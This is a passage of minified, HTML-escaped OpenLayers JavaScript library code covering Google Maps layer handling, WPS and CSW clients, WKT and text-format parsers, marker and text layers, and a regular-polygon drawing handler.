d=this.type,e=c.layers,f,g=e.length-1;0&lt;=g;--g)if(f=e[g],f instanceof OpenLayers.Layer.Google&amp;&amp;!0===f.visibility&amp;&amp;!0===f.inRange){d=f.type;a=!0;break}e=this.mapObject.getDiv();if(!0===a){if(e.parentNode!==c.div)if(b.rendered)c.div.appendChild(e),b.googleControl.appendChild(c.viewPortDiv),google.maps.event.trigger(this.mapObject,"resize");else{var h=this;google.maps.event.addListenerOnce(this.mapObject, "tilesloaded",function(){b.rendered=!0;h.setGMapVisibility(h.getVisibility());h.moveTo(h.map.getCenter())})}this.mapObject.setMapTypeId(d)}else b.googleControl.hasChildNodes()&amp;&amp;(c.div.appendChild(c.viewPortDiv),c.div.removeChild(e))}},getMapContainer:function(){return this.mapObject.getDiv()},getMapObjectBoundsFromOLBounds:function(a){var b=null;null!=a&amp;&amp;(b=this.sphericalMercator?this.inverseMercator(a.bottom,a.left):new OpenLayers.LonLat(a.bottom,a.left),a=this.sphericalMercator?this.inverseMercator(a.top, a.right):new OpenLayers.LonLat(a.top,a.right),b=new google.maps.LatLngBounds(new google.maps.LatLng(b.lat,b.lon),new google.maps.LatLng(a.lat,a.lon)));return b},getMapObjectLonLatFromMapObjectPixel:function(a){var b=this.map.getSize(),c=this.getLongitudeFromMapObjectLonLat(this.mapObject.center),d=this.getLatitudeFromMapObjectLonLat(this.mapObject.center),e=this.map.getResolution();a=new OpenLayers.LonLat(c+(a.x-b.w/2)*e,d-(a.y-b.h/2)*e);this.wrapDateLine&amp;&amp;(a=a.wrapDateLine(this.maxExtent));return this.getMapObjectLonLatFromLonLat(a.lon, a.lat)},getMapObjectPixelFromMapObjectLonLat:function(a){var b=this.getLongitudeFromMapObjectLonLat(a);a=this.getLatitudeFromMapObjectLonLat(a);var c=this.map.getResolution(),d=this.map.getExtent();return this.getMapObjectPixelFromXY(1/c*(b-d.left),1/c*(d.top-a))},setMapObjectCenter:function(a,b){if(!1===this.animationEnabled&amp;&amp;b!=this.mapObject.zoom){var c=this.getMapContainer();google.maps.event.addListenerOnce(this.mapObject,"idle",function(){c.style.visibility=""});c.style.visibility="hidden"}this.mapObject.setOptions({center:a, zoom:b})},getMapObjectZoomFromMapObjectBounds:function(a){return this.mapObject.getBoundsZoomLevel(a)},getMapObjectLonLatFromLonLat:function(a,b){var c;this.sphericalMercator?(c=this.inverseMercator(a,b),c=new google.maps.LatLng(c.lat,c.lon)):c=new google.maps.LatLng(b,a);return c},getMapObjectPixelFromXY:function(a,b){return new google.maps.Point(a,b)}};OpenLayers.Format.WPSDescribeProcess=OpenLayers.Class(OpenLayers.Format.XML,{VERSION:"1.0.0",namespaces:{wps:"http://www.opengis.net/wps/1.0.0",ows:"http://www.opengis.net/ows/1.1",xsi:"http://www.w3.org/2001/XMLSchema-instance"},schemaLocation:"http://www.opengis.net/wps/1.0.0 http://schemas.opengis.net/wps/1.0.0/wpsAll.xsd",defaultPrefix:"wps",regExes:{trimSpace:/^\s*|\s*$/g,removeSpace:/\s*/g,splitSpace:/\s+/,trimComma:/\s*,\s*/g},read:function(a){"string"==typeof a&amp;&amp;(a=OpenLayers.Format.XML.prototype.read.apply(this, [a]));a&amp;&amp;9==a.nodeType&amp;&amp;(a=a.documentElement);var b={};this.readNode(a,b);return b},readers:{wps:{ProcessDescriptions:function(a,b){b.processDescriptions={};this.readChildNodes(a,b.processDescriptions)},ProcessDescription:function(a,b){var c={processVersion:this.getAttributeNS(a,this.namespaces.wps,"processVersion"),statusSupported:"true"===a.getAttribute("statusSupported"),storeSupported:"true"===a.getAttribute("storeSupported")};this.readChildNodes(a,c);b[c.identifier]=c},DataInputs:function(a, b){b.dataInputs=[];this.readChildNodes(a,b.dataInputs)},ProcessOutputs:function(a,b){b.processOutputs=[];this.readChildNodes(a,b.processOutputs)},Output:function(a,b){var c={};this.readChildNodes(a,c);b.push(c)},ComplexOutput:function(a,b){b.complexOutput={};this.readChildNodes(a,b.complexOutput)},LiteralOutput:function(a,b){b.literalOutput={};this.readChildNodes(a,b.literalOutput)},Input:function(a,b){var c={maxOccurs:parseInt(a.getAttribute("maxOccurs")),minOccurs:parseInt(a.getAttribute("minOccurs"))}; this.readChildNodes(a,c);b.push(c)},BoundingBoxData:function(a,b){b.boundingBoxData={};this.readChildNodes(a,b.boundingBoxData)},CRS:function(a,b){b.CRSs||(b.CRSs={});b.CRSs[this.getChildValue(a)]=!0},LiteralData:function(a,b){b.literalData={};this.readChildNodes(a,b.literalData)},ComplexData:function(a,b){b.complexData={};this.readChildNodes(a,b.complexData)},Default:function(a,b){b["default"]={};this.readChildNodes(a,b["default"])},Supported:function(a,b){b.supported={};this.readChildNodes(a,b.supported)}, Format:function(a,b){var c={};this.readChildNodes(a,c);b.formats||(b.formats={});b.formats[c.mimeType]=!0},MimeType:function(a,b){b.mimeType=this.getChildValue(a)}},ows:OpenLayers.Format.OWSCommon.v1_1_0.prototype.readers.ows},CLASS_NAME:"OpenLayers.Format.WPSDescribeProcess"});OpenLayers.Format.WKT=OpenLayers.Class(OpenLayers.Format,{initialize:function(a){this.regExes={typeStr:/^\s*(\w+)\s*\(\s*(.*)\s*\)\s*$/,spaces:/\s+/,parenComma:/\)\s*,\s*\(/,doubleParenComma:/\)\s*\)\s*,\s*\(\s*\(/,trimParens:/^\s*\(?(.*?)\)?\s*$/};OpenLayers.Format.prototype.initialize.apply(this,[a])},read:function(a){var b,c;a=a.replace(/[\n\r]/g," ");if(c=this.regExes.typeStr.exec(a))if(a=c[1].toLowerCase(),c=c[2],this.parse[a]&amp;&amp;(b=this.parse[a].apply(this,[c])),this.internalProjection&amp;&amp;this.externalProjection)if(b&amp;&amp; "OpenLayers.Feature.Vector"==b.CLASS_NAME)b.geometry.transform(this.externalProjection,this.internalProjection);else if(b&amp;&amp;"geometrycollection"!=a&amp;&amp;"object"==typeof b)for(a=0,c=b.length;a&lt;c;a++)b[a].geometry.transform(this.externalProjection,this.internalProjection);return b},write:function(a){var b,c;a.constructor==Array?c=!0:(a=[a],c=!1);var d=[];c&amp;&amp;d.push("GEOMETRYCOLLECTION(");for(var e=0,f=a.length;e&lt;f;++e)c&amp;&amp;0&lt;e&amp;&amp;d.push(","),b=a[e].geometry,d.push(this.extractGeometry(b));c&amp;&amp;d.push(")");return d.join("")}, extractGeometry:function(a){var b=a.CLASS_NAME.split(".")[2].toLowerCase();if(!this.extract[b])return null;this.internalProjection&amp;&amp;this.externalProjection&amp;&amp;(a=a.clone(),a.transform(this.internalProjection,this.externalProjection));return("collection"==b?"GEOMETRYCOLLECTION":b.toUpperCase())+"("+this.extract[b].apply(this,[a])+")"},extract:{point:function(a){return a.x+" "+a.y},multipoint:function(a){for(var b=[],c=0,d=a.components.length;c&lt;d;++c)b.push("("+this.extract.point.apply(this,[a.components[c]])+ ")");return b.join(",")},linestring:function(a){for(var b=[],c=0,d=a.components.length;c&lt;d;++c)b.push(this.extract.point.apply(this,[a.components[c]]));return b.join(",")},multilinestring:function(a){for(var b=[],c=0,d=a.components.length;c&lt;d;++c)b.push("("+this.extract.linestring.apply(this,[a.components[c]])+")");return b.join(",")},polygon:function(a){for(var b=[],c=0,d=a.components.length;c&lt;d;++c)b.push("("+this.extract.linestring.apply(this,[a.components[c]])+")");return b.join(",")},multipolygon:function(a){for(var b= [],c=0,d=a.components.length;c&lt;d;++c)b.push("("+this.extract.polygon.apply(this,[a.components[c]])+")");return b.join(",")},collection:function(a){for(var b=[],c=0,d=a.components.length;c&lt;d;++c)b.push(this.extractGeometry.apply(this,[a.components[c]]));return b.join(",")}},parse:{point:function(a){a=OpenLayers.String.trim(a).split(this.regExes.spaces);return new OpenLayers.Feature.Vector(new OpenLayers.Geometry.Point(a[0],a[1]))},multipoint:function(a){for(var b=OpenLayers.String.trim(a).split(","), c=[],d=0,e=b.length;d&lt;e;++d)a=b[d].replace(this.regExes.trimParens,"$1"),c.push(this.parse.point.apply(this,[a]).geometry);return new OpenLayers.Feature.Vector(new OpenLayers.Geometry.MultiPoint(c))},linestring:function(a){a=OpenLayers.String.trim(a).split(",");for(var b=[],c=0,d=a.length;c&lt;d;++c)b.push(this.parse.point.apply(this,[a[c]]).geometry);return new OpenLayers.Feature.Vector(new OpenLayers.Geometry.LineString(b))},multilinestring:function(a){for(var b=OpenLayers.String.trim(a).split(this.regExes.parenComma), c=[],d=0,e=b.length;d&lt;e;++d)a=b[d].replace(this.regExes.trimParens,"$1"),c.push(this.parse.linestring.apply(this,[a]).geometry);return new OpenLayers.Feature.Vector(new OpenLayers.Geometry.MultiLineString(c))},polygon:function(a){var b;a=OpenLayers.String.trim(a).split(this.regExes.parenComma);for(var c=[],d=0,e=a.length;d&lt;e;++d)b=a[d].replace(this.regExes.trimParens,"$1"),b=this.parse.linestring.apply(this,[b]).geometry,b=new OpenLayers.Geometry.LinearRing(b.components),c.push(b);return new OpenLayers.Feature.Vector(new OpenLayers.Geometry.Polygon(c))}, multipolygon:function(a){for(var b=OpenLayers.String.trim(a).split(this.regExes.doubleParenComma),c=[],d=0,e=b.length;d&lt;e;++d)a=b[d].replace(this.regExes.trimParens,"$1"),c.push(this.parse.polygon.apply(this,[a]).geometry);return new OpenLayers.Feature.Vector(new OpenLayers.Geometry.MultiPolygon(c))},geometrycollection:function(a){a=a.replace(/,\s*([A-Za-z])/g,"|$1");a=OpenLayers.String.trim(a).split("|");for(var b=[],c=0,d=a.length;c&lt;d;++c)b.push(OpenLayers.Format.WKT.prototype.read.apply(this,[a[c]])); return b}},CLASS_NAME:"OpenLayers.Format.WKT"});OpenLayers.WPSProcess=OpenLayers.Class({client:null,server:null,identifier:null,description:null,localWPS:"http://geoserver/wps",formats:null,chained:0,executeCallbacks:null,initialize:function(a){OpenLayers.Util.extend(this,a);this.executeCallbacks=[];this.formats={"application/wkt":new OpenLayers.Format.WKT,"application/json":new OpenLayers.Format.GeoJSON}},describe:function(a){a=a||{};if(!this.description)this.client.describeProcess(this.server,this.identifier,function(b){this.description||this.parseDescription(b); a.callback&amp;&amp;a.callback.call(a.scope,this.description)},this);else if(a.callback){var b=this.description;window.setTimeout(function(){a.callback.call(a.scope,b)},0)}},configure:function(a){this.describe({callback:function(){var b=this.description,c=a.inputs,d,e,f;e=0;for(f=b.dataInputs.length;e&lt;f;++e)d=b.dataInputs[e],this.setInputData(d,c[d.identifier]);a.callback&amp;&amp;a.callback.call(a.scope)},scope:this});return this},execute:function(a){this.configure({inputs:a.inputs,callback:function(){var b=this, c=this.getOutputIndex(b.description.processOutputs,a.output);b.setResponseForm({outputIndex:c});(function e(){OpenLayers.Util.removeItem(b.executeCallbacks,e);0!==b.chained?b.executeCallbacks.push(e):OpenLayers.Request.POST({url:b.client.servers[b.server].url,data:(new OpenLayers.Format.WPSExecute).write(b.description),success:function(e){var g=b.findMimeType(b.description.processOutputs[c].complexOutput.supported.formats);e=b.formats[g].read(e.responseText);e instanceof OpenLayers.Feature.Vector&amp;&amp; (e=[e]);a.success&amp;&amp;(g={},g[a.output||"result"]=e,a.success.call(a.scope,g))},scope:b})})()},scope:this})},output:function(a){return new OpenLayers.WPSProcess.ChainLink({process:this,output:a})},parseDescription:function(a){a=this.client.servers[this.server];this.description=(new OpenLayers.Format.WPSDescribeProcess).read(a.processDescription[this.identifier]).processDescriptions[this.identifier]},setInputData:function(a,b){delete a.data;delete a.reference;if(b instanceof OpenLayers.WPSProcess.ChainLink)++this.chained, a.reference={method:"POST",href:b.process.server===this.server?this.localWPS:this.client.servers[b.process.server].url},b.process.describe({callback:function(){--this.chained;this.chainProcess(a,b)},scope:this});else{a.data={};var c=a.complexData;c?(c=this.findMimeType(c.supported.formats),a.data.complexData={mimeType:c,value:this.formats[c].write(this.toFeatures(b))}):a.data.literalData={value:b}}},setResponseForm:function(a){a=a||{};var b=this.description.processOutputs[a.outputIndex||0];this.description.responseForm= {rawDataOutput:{identifier:b.identifier,mimeType:this.findMimeType(b.complexOutput.supported.formats,a.supportedFormats)}}},getOutputIndex:function(a,b){var c;if(b)for(var d=a.length-1;0&lt;=d;--d){if(a[d].identifier===b){c=d;break}}else c=0;return c},chainProcess:function(a,b){var c=this.getOutputIndex(b.process.description.processOutputs,b.output);a.reference.mimeType=this.findMimeType(a.complexData.supported.formats,b.process.description.processOutputs[c].complexOutput.supported.formats);var d={}; d[a.reference.mimeType]=!0;b.process.setResponseForm({outputIndex:c,supportedFormats:d});for(a.reference.body=b.process.description;0&lt;this.executeCallbacks.length;)this.executeCallbacks[0]()},toFeatures:function(a){var b=OpenLayers.Util.isArray(a);b||(a=[a]);for(var c=Array(a.length),d,e=0,f=a.length;e&lt;f;++e)d=a[e],c[e]=d instanceof OpenLayers.Feature.Vector?d:new OpenLayers.Feature.Vector(d);return b?c:c[0]},findMimeType:function(a,b){b=b||this.formats;for(var c in a)if(c in b)return c},CLASS_NAME:"OpenLayers.WPSProcess"}); OpenLayers.WPSProcess.ChainLink=OpenLayers.Class({process:null,output:null,initialize:function(a){OpenLayers.Util.extend(this,a)},CLASS_NAME:"OpenLayers.WPSProcess.ChainLink"});OpenLayers.WPSClient=OpenLayers.Class({servers:null,version:"1.0.0",lazy:!1,events:null,initialize:function(a){OpenLayers.Util.extend(this,a);this.events=new OpenLayers.Events(this);this.servers={};for(var b in a.servers)this.servers[b]="string"==typeof a.servers[b]?{url:a.servers[b],version:this.version,processDescription:{}}:a.servers[b]},execute:function(a){this.getProcess(a.server,a.process).execute({inputs:a.inputs,success:a.success,scope:a.scope})},getProcess:function(a,b){var c=new OpenLayers.WPSProcess({client:this, server:a,identifier:b});this.lazy||c.describe();return c},describeProcess:function(a,b,c,d){var e=this.servers[a];e.processDescription[b]?window.setTimeout(function(){c.call(d,e.processDescription[b])},0):b in e.processDescription?this.events.register("describeprocess",this,function g(a){a.identifier===b&amp;&amp;(this.events.unregister("describeprocess",this,g),c.call(d,a.raw))}):(e.processDescription[b]=null,OpenLayers.Request.GET({url:e.url,params:{SERVICE:"WPS",VERSION:e.version,REQUEST:"DescribeProcess", IDENTIFIER:b},success:function(a){e.processDescription[b]=a.responseText;this.events.triggerEvent("describeprocess",{identifier:b,raw:a.responseText})},scope:this}))},destroy:function(){this.events.destroy();this.servers=this.events=null},CLASS_NAME:"OpenLayers.WPSClient"});OpenLayers.Format.CSWGetRecords.v2_0_2=OpenLayers.Class(OpenLayers.Format.XML,{namespaces:{csw:"http://www.opengis.net/cat/csw/2.0.2",dc:"http://purl.org/dc/elements/1.1/",dct:"http://purl.org/dc/terms/",gmd:"http://www.isotc211.org/2005/gmd",geonet:"http://www.fao.org/geonetwork",ogc:"http://www.opengis.net/ogc",ows:"http://www.opengis.net/ows",xlink:"http://www.w3.org/1999/xlink",xsi:"http://www.w3.org/2001/XMLSchema-instance"},defaultPrefix:"csw",version:"2.0.2",schemaLocation:"http://www.opengis.net/cat/csw/2.0.2 http://schemas.opengis.net/csw/2.0.2/CSW-discovery.xsd", requestId:null,resultType:null,outputFormat:null,outputSchema:null,startPosition:null,maxRecords:null,DistributedSearch:null,ResponseHandler:null,Query:null,regExes:{trimSpace:/^\s*|\s*$/g,removeSpace:/\s*/g,splitSpace:/\s+/,trimComma:/\s*,\s*/g},initialize:function(a){OpenLayers.Format.XML.prototype.initialize.apply(this,[a])},read:function(a){"string"==typeof a&amp;&amp;(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));a&amp;&amp;9==a.nodeType&amp;&amp;(a=a.documentElement);var b={};this.readNode(a,b);return b}, readers:{csw:{GetRecordsResponse:function(a,b){b.records=[];this.readChildNodes(a,b);var c=this.getAttributeNS(a,"","version");""!=c&amp;&amp;(b.version=c)},RequestId:function(a,b){b.RequestId=this.getChildValue(a)},SearchStatus:function(a,b){b.SearchStatus={};var c=this.getAttributeNS(a,"","timestamp");""!=c&amp;&amp;(b.SearchStatus.timestamp=c)},SearchResults:function(a,b){this.readChildNodes(a,b);for(var c=a.attributes,d={},e=0,f=c.length;e&lt;f;++e)d[c[e].name]="numberOfRecordsMatched"==c[e].name||"numberOfRecordsReturned"== c[e].name||"nextRecord"==c[e].name?parseInt(c[e].nodeValue):c[e].nodeValue;b.SearchResults=d},SummaryRecord:function(a,b){var c={type:"SummaryRecord"};this.readChildNodes(a,c);b.records.push(c)},BriefRecord:function(a,b){var c={type:"BriefRecord"};this.readChildNodes(a,c);b.records.push(c)},DCMIRecord:function(a,b){var c={type:"DCMIRecord"};this.readChildNodes(a,c);b.records.push(c)},Record:function(a,b){var c={type:"Record"};this.readChildNodes(a,c);b.records.push(c)},"*":function(a,b){var c=a.localName|| a.nodeName.split(":").pop();b[c]=this.getChildValue(a)}},geonet:{info:function(a,b){var c={};this.readChildNodes(a,c);b.gninfo=c}},dc:{"*":function(a,b){var c=a.localName||a.nodeName.split(":").pop();OpenLayers.Util.isArray(b[c])||(b[c]=[]);for(var d={},e=a.attributes,f=0,g=e.length;f&lt;g;++f)d[e[f].name]=e[f].nodeValue;d.value=this.getChildValue(a);""!=d.value&amp;&amp;b[c].push(d)}},dct:{"*":function(a,b){var c=a.localName||a.nodeName.split(":").pop();OpenLayers.Util.isArray(b[c])||(b[c]=[]);b[c].push(this.getChildValue(a))}}, ows:OpenLayers.Util.applyDefaults({BoundingBox:function(a,b){b.bounds&amp;&amp;(b.BoundingBox=[{crs:b.projection,value:[b.bounds.left,b.bounds.bottom,b.bounds.right,b.bounds.top]}],delete b.projection,delete b.bounds);OpenLayers.Format.OWSCommon.v1_0_0.prototype.readers.ows.BoundingBox.apply(this,arguments)}},OpenLayers.Format.OWSCommon.v1_0_0.prototype.readers.ows)},write:function(a){a=this.writeNode("csw:GetRecords",a);a.setAttribute("xmlns:gmd",this.namespaces.gmd);return OpenLayers.Format.XML.prototype.write.apply(this, [a])},writers:{csw:{GetRecords:function(a){a||(a={});var b=this.createElementNSPlus("csw:GetRecords",{attributes:{service:"CSW",version:this.version,requestId:a.requestId||this.requestId,resultType:a.resultType||this.resultType,outputFormat:a.outputFormat||this.outputFormat,outputSchema:a.outputSchema||this.outputSchema,startPosition:a.startPosition||this.startPosition,maxRecords:a.maxRecords||this.maxRecords}});(a.DistributedSearch||this.DistributedSearch)&amp;&amp;this.writeNode("csw:DistributedSearch", a.DistributedSearch||this.DistributedSearch,b);var c=a.ResponseHandler||this.ResponseHandler;if(OpenLayers.Util.isArray(c)&amp;&amp;0&lt;c.length)for(var d=0,e=c.length;d&lt;e;d++)this.writeNode("csw:ResponseHandler",c[d],b);this.writeNode("Query",a.Query||this.Query,b);return b},DistributedSearch:function(a){return this.createElementNSPlus("csw:DistributedSearch",{attributes:{hopCount:a.hopCount}})},ResponseHandler:function(a){return this.createElementNSPlus("csw:ResponseHandler",{value:a.value})},Query:function(a){a|| (a={});var b=this.createElementNSPlus("csw:Query",{attributes:{typeNames:a.typeNames||"csw:Record"}}),c=a.ElementName;if(OpenLayers.Util.isArray(c)&amp;&amp;0&lt;c.length)for(var d=0,e=c.length;d&lt;e;d++)this.writeNode("csw:ElementName",c[d],b);else this.writeNode("csw:ElementSetName",a.ElementSetName||{value:"summary"},b);a.Constraint&amp;&amp;this.writeNode("csw:Constraint",a.Constraint,b);a.SortBy&amp;&amp;this.writeNode("ogc:SortBy",a.SortBy,b);return b},ElementName:function(a){return this.createElementNSPlus("csw:ElementName", {value:a.value})},ElementSetName:function(a){return this.createElementNSPlus("csw:ElementSetName",{attributes:{typeNames:a.typeNames},value:a.value})},Constraint:function(a){var b=this.createElementNSPlus("csw:Constraint",{attributes:{version:a.version}});if(a.Filter){var c=new OpenLayers.Format.Filter({version:a.version});b.appendChild(c.write(a.Filter))}else a.CqlText&amp;&amp;(a=this.createElementNSPlus("CqlText",{value:a.CqlText.value}),b.appendChild(a));return b}},ogc:OpenLayers.Format.Filter.v1_1_0.prototype.writers.ogc}, CLASS_NAME:"OpenLayers.Format.CSWGetRecords.v2_0_2"});/* Apache 2 Contains portions of Rico &lt;http://openrico.org/> Copyright 2005 Sabre Airline Solutions Licensed under the Apache License, Version 2.0 (the "License"); you may not use this file except in compliance with the License. You may obtain a copy of the License at http://www.apache.org/licenses/LICENSE-2.0 Unless required by applicable law or agreed to in writing, software distributed under the License is distributed on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License. */ OpenLayers.Marker.Box=OpenLayers.Class(OpenLayers.Marker,{bounds:null,div:null,initialize:function(a,b,c){this.bounds=a;this.div=OpenLayers.Util.createDiv();this.div.style.overflow="hidden";this.events=new OpenLayers.Events(this,this.div);this.setBorder(b,c)},destroy:function(){this.div=this.bounds=null;OpenLayers.Marker.prototype.destroy.apply(this,arguments)},setBorder:function(a,b){a||(a="red");b||(b=2);this.div.style.border=b+"px solid "+a},draw:function(a,b){OpenLayers.Util.modifyDOMElement(this.div, null,a,b);return this.div},onScreen:function(){var a=!1;this.map&amp;&amp;(a=this.map.getExtent().containsBounds(this.bounds,!0,!0));return a},display:function(a){this.div.style.display=a?"":"none"},CLASS_NAME:"OpenLayers.Marker.Box"});OpenLayers.Format.Text=OpenLayers.Class(OpenLayers.Format,{defaultStyle:null,extractStyles:!0,initialize:function(a){a=a||{};!1!==a.extractStyles&amp;&amp;(a.defaultStyle={externalGraphic:OpenLayers.Util.getImageLocation("marker.png"),graphicWidth:21,graphicHeight:25,graphicXOffset:-10.5,graphicYOffset:-12.5});OpenLayers.Format.prototype.initialize.apply(this,[a])},read:function(a){a=a.split("\n");for(var b,c=[],d=0;d&lt;a.length-1;d++){var e=a[d].replace(/^\s*/,"").replace(/\s*$/,"");if("#"!=e.charAt(0))if(b){for(var e= e.split("\t"),f=new OpenLayers.Geometry.Point(0,0),g={},h=this.defaultStyle?OpenLayers.Util.applyDefaults({},this.defaultStyle):null,k=!1,l=0;l&lt;e.length;l++)if(e[l])if("point"==b[l])k=e[l].split(","),f.y=parseFloat(k[0]),f.x=parseFloat(k[1]),k=!0;else if("lat"==b[l])f.y=parseFloat(e[l]),k=!0;else if("lon"==b[l])f.x=parseFloat(e[l]),k=!0;else if("title"==b[l])g.title=e[l];else if("image"==b[l]||"icon"==b[l]&amp;&amp;h)h.externalGraphic=e[l];else if("iconSize"==b[l]&amp;&amp;h){var m=e[l].split(",");h.graphicWidth= parseFloat(m[0]);h.graphicHeight=parseFloat(m[1])}else"iconOffset"==b[l]&amp;&amp;h?(m=e[l].split(","),h.graphicXOffset=parseFloat(m[0]),h.graphicYOffset=parseFloat(m[1])):"description"==b[l]?g.description=e[l]:"overflow"==b[l]?g.overflow=e[l]:g[b[l]]=e[l];k&amp;&amp;(this.internalProjection&amp;&amp;this.externalProjection&amp;&amp;f.transform(this.externalProjection,this.internalProjection),e=new OpenLayers.Feature.Vector(f,g,h),c.push(e))}else b=e.split("\t")}return c},CLASS_NAME:"OpenLayers.Format.Text"});OpenLayers.Layer.Text=OpenLayers.Class(OpenLayers.Layer.Markers,{location:null,features:null,formatOptions:null,selectedFeature:null,initialize:function(a,b){OpenLayers.Layer.Markers.prototype.initialize.apply(this,arguments);this.features=[]},destroy:function(){OpenLayers.Layer.Markers.prototype.destroy.apply(this,arguments);this.clearFeatures();this.features=null},loadText:function(){this.loaded||null==this.location||(this.events.triggerEvent("loadstart"),OpenLayers.Request.GET({url:this.location, success:this.parseData,failure:function(a){this.events.triggerEvent("loadend")},scope:this}),this.loaded=!0)},moveTo:function(a,b,c){OpenLayers.Layer.Markers.prototype.moveTo.apply(this,arguments);this.visibility&amp;&amp;!this.loaded&amp;&amp;this.loadText()},parseData:function(a){a=a.responseText;var b={};OpenLayers.Util.extend(b,this.formatOptions);this.map&amp;&amp;!this.projection.equals(this.map.getProjectionObject())&amp;&amp;(b.externalProjection=this.projection,b.internalProjection=this.map.getProjectionObject());a=(new OpenLayers.Format.Text(b)).read(a); for(var b=0,c=a.length;b&lt;c;b++){var d={},e=a[b],f,g,h;f=new OpenLayers.LonLat(e.geometry.x,e.geometry.y);e.style.graphicWidth&amp;&amp;e.style.graphicHeight&amp;&amp;(g=new OpenLayers.Size(e.style.graphicWidth,e.style.graphicHeight));void 0!==e.style.graphicXOffset&amp;&amp;void 0!==e.style.graphicYOffset&amp;&amp;(h=new OpenLayers.Pixel(e.style.graphicXOffset,e.style.graphicYOffset));null!=e.style.externalGraphic?d.icon=new OpenLayers.Icon(e.style.externalGraphic,g,h):(d.icon=OpenLayers.Marker.defaultIcon(),null!=g&amp;&amp;d.icon.setSize(g)); null!=e.attributes.title&amp;&amp;null!=e.attributes.description&amp;&amp;(d.popupContentHTML="&lt;h2>"+e.attributes.title+"&lt;/h2>&lt;p>"+e.attributes.description+"&lt;/p>");d.overflow=e.attributes.overflow||"auto";d=new OpenLayers.Feature(this,f,d);this.features.push(d);f=d.createMarker();null!=e.attributes.title&amp;&amp;null!=e.attributes.description&amp;&amp;f.events.register("click",d,this.markerClick);this.addMarker(f)}this.events.triggerEvent("loadend")},markerClick:function(a){var b=this==this.layer.selectedFeature;this.layer.selectedFeature= b?null:this;for(var c=0,d=this.layer.map.popups.length;c&lt;d;c++)this.layer.map.removePopup(this.layer.map.popups[c]);b||this.layer.map.addPopup(this.createPopup());OpenLayers.Event.stop(a)},clearFeatures:function(){if(null!=this.features)for(;0&lt;this.features.length;){var a=this.features[0];OpenLayers.Util.removeItem(this.features,a);a.destroy()}},CLASS_NAME:"OpenLayers.Layer.Text"});OpenLayers.Handler.RegularPolygon=OpenLayers.Class(OpenLayers.Handler.Drag,{sides:4,radius:null,snapAngle:null,snapToggle:"shiftKey",layerOptions:null,persist:!1,irregular:!1,citeCompliant:!1,angle:null,fixedRadius:!1,feature:null,layer:null,origin:null,initialize:function(a,b,c){c&amp;&amp;c.layerOptions&amp;&amp;c.layerOptions.styleMap||(this.style=OpenLayers.Util.extend(OpenLayers.Feature.Vector.style["default"],{}));OpenLayers.Handler.Drag.prototype.initialize.apply(this,[a,b,c]);this.options=c?c:{}},setOptions:function(a){OpenLayers.Util.extend(this.options, a);OpenLayers.Util.extend(this,a)},activate:function(){var a=!1;OpenLayers.Handler.Drag.prototype.activate.apply(this,arguments)&amp;&amp;(a=OpenLayers.Util.extend({displayInLayerSwitcher:!1,calculateInRange:OpenLayers.Function.True,wrapDateLine:this.citeCompliant},this.layerOptions),this.layer=new OpenLayers.Layer.Vector(this.CLASS_NAME,a),this.map.addLayer(this.layer),a=!0);return a},deactivate:function(){var a=!1;OpenLayers.Handler.Drag.prototype.deactivate.apply(this,arguments)&amp;&amp;(this.dragging&amp;&amp;this.cancel(), null!=this.layer.map&amp;&amp;(this.layer.destroy(!1),this.feature&amp;&amp;this.feature.destroy()),this.feature=this.layer=null,a=!0);return a},down:function(a){this.fixedRadius=!!this.radius;a=this.layer.getLonLatFromViewPortPx(a.xy);this.origin=new OpenLayers.Geometry.Point(a.lon,a.lat);if(!this.fixedRadius||this.irregular)this.radius=this.map.getResolution();this.persist&amp;&amp;this.clear();this.feature=new OpenLayers.Feature.Vector;this.createGeometry();this.callback("create",[this.origin,this.feature]);this.layer.addFeatures([this.feature], {silent:!0});this.layer.drawFeature(this.feature,this.style)},move:function(a){var b=this.layer.getLonLatFromViewPortPx(a.xy),b=new OpenLayers.Geometry.Point(b.lon,b.lat);this.irregular?(a=Math.sqrt(2)*Math.abs(b.y-this.origin.y)/2,this.radius=Math.max(this.map.getResolution()/2,a)):this.fixedRadius?this.origin=b:(this.calculateAngle(b,a),this.radius=Math.max(this.map.getResolution()/2,b.distanceTo(this.origin)));this.modifyGeometry();if(this.irregular){a=b.x-this.origin.x;var b=b.y-this.origin.y, c;c=0==b?a/(this.radius*Math.sqrt(2)):a/b;this.feature.geometry.resize(1,this.origin,c);this.feature.geometry.move(a/2,b/2)}this.layer.drawFeature(this.feature,this.style)},up:function(a){this.finalize();this.start==this.last&amp;&amp;this.callback("done",[a.xy])},out:function(a){this.finalize()},createGeometry:function(){this.angle=Math.PI*(1/this.sides-0.5);this.snapAngle&amp;&amp;(this.angle+=this.snapAngle*(Math.PI/180));this.feature.geometry=OpenLayers.Geometry.Polygon.createRegularPolygon(this.origin,this.radius, this.sides,this.snapAngle)},modifyGeometry:function(){var a,b,c=this.feature.geometry.components[0];c.components.length!=this.sides+1&amp;&amp;(this.createGeometry(),c=this.feature.geometry.components[0]);for(var d=0;d&lt;this.sides;++d)b=c.components[d],a=this.angle+2*d*Math.PI/this.sides,b.x=this.origin.x+this.radius*Math.cos(a),b.y=this.origin.y+this.radius*Math.sin(a),b.clearBounds()},calculateAngle:function(a,b){var c=Math.atan2(a.y-this.origin.y,a.x-this.origin.x);if(this.snapAngle&amp;&amp;this.snapToggle&amp;&amp;!b[this.snapToggle]){var d= Math.PI/180*this.snapAngle;this.angle=Math.round(c/d)*d}else this.angle=c},cancel:function(){this.callback("cancel",null);this.finalize()},finalize:function(){this.origin=null;this.radius=this.options.radius},clear:function(){this.layer&amp;&amp;(this.layer.renderer.clear(),this.layer.destroyFeatures())},callback:function(a,b){this.callbacks[a]&amp;&amp;this.callbacks[a].apply(this.control,[this.feature.geometry.clone()]);this.persist||"done"!=a&amp;&amp;"cancel"!=a||this.clear()},CLASS_NAME:"OpenLayers.Handler.RegularPolygon"});OpenLayers.Control.SLDSelect=OpenLayers.Class(OpenLayers.Control,{clearOnDeactivate:!1,layers:null,callbacks:null,selectionSymbolizer:{Polygon:{fillColor:"#FF0000",stroke:!1},Line:{strokeColor:"#FF0000",strokeWidth:2},Point:{graphicName:"square",fillColor:"#FF0000",pointRadius:5}},layerOptions:null,sketchStyle:null,wfsCache:{},layerCache:{},initialize:function(a,b){OpenLayers.Control.prototype.initialize.apply(this,[b]);this.callbacks=OpenLayers.Util.extend({done:this.select,click:this.select},this.callbacks); 